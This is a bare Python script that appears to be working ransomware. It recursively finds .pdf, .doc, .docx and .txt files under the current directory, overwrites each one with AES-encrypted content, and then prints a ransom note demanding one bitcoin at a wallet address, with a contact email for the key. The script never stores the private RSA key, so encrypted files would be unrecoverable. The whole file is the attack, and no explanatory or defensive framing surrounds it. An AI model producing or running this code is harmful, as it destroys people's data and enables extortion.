import os
import hashlib
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Generate RSA key pair for asymmetric encryption
rsa_key = RSA.generate(2048)
private_key = rsa_key.export_key()
public_key = rsa_key.publickey().export_key()

# Define the encryption key (this should be securely stored and managed)
aes_key = get_random_bytes(16)  # 128-bit key for AES

# Define the file extensions to target
target_extensions = ['.pdf', '.doc', '.docx', '.txt']

def encrypt_file(file_path, aes_key, public_key):
    with open(file_path, 'rb') as file:
        data = file.read()

    # Encrypt the AES key with the RSA public key
    cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)

    # Encrypt the file data with the AES key
    cipher_aes = AES.new(aes_key, AES.MODE_CBC)
    ct_bytes = cipher_aes.encrypt(pad(data, AES.block_size))
    iv = cipher_aes.iv

    # Calculate the checksum of the encrypted data
    checksum = hashlib.sha256(ct_bytes).digest()

    with open(file_path, 'wb') as file:
        file.write(encrypted_aes_key + iv + ct_bytes + checksum)

def scan_and_encrypt(directory, aes_key, public_key):
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in target_extensions):
                file_path = os.path.join(root, file)
                print(f"Encrypting {file_path}")
                encrypt_file(file_path, aes_key, public_key)

def display_ransom_note():
    ransom_note = """
    =====================================================
    Your files have been encrypted.
    To decrypt your files, send 1 BTC to the following address:
    1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    After payment, contact us at ransom@example.com for the decryption key.
    =====================================================
    """
    print(ransom_note)

if __name__ == "__main__":
    # Define the directory to scan (e.g., the current directory)
    directory_to_scan = '.'
    scan_and_encrypt(directory_to_scan, aes_key, public_key)
    display_ransom_note()
    print("Encryption complete.")
